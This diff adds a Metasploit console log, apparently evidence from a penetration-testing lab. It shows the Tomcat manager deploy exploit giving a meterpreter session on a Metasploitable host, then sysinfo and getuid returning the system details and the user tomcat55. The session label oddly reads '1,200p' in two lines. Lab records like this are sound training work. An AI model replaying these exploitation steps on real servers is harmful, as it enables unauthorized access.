@@ -1,0 +1,20 @@
+[1m[34m[*][0m Spooling to file /home/kali/vapt_lab/task4/results/basic_evidence.txt...
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -i 1 -c "sysinfo; getuid"
+[0m[1m[34m[*][0m Running 'sysinfo; getuid' on meterpreter session 1 (192.168.222.129)
+sh: sysinfo: command not found
+sh: getuid: command not found
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1,200p...
+
+[4mmeterpreter[0m > sysinfo
+[0mComputer        : metasploitable
+OS              : Linux 2.6.24-16-server (i386)
+Architecture    : x86
+System Language : en_US
+Meterpreter     : java/linux
+[4mmeterpreter[0m > getuid
+[0mServer username: tomcat55
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 1,200p...
+[4mmsf[0m exploit([1m[31mmulti/http/tomcat_mgr_deploy[0m) [0m> spool off
+[0m
